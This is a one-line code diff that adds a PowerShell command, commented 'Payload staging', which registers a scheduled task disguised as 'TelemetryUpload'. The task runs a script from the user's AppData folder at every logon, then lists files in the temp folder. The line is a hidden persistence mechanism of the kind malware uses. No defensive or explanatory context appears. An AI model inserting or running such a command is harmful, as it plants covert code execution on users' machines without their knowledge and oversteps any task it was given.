@@ -1,0 +1,1 @@
+<# Payload staging #> schtasks.exe /Create /TN "TelemetryUpload" /TR "powershell.exe -NoP -File `"$env:APPDATA\updater.ps1`"" /SC ONLOGON /RU $env:USERNAME /F; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
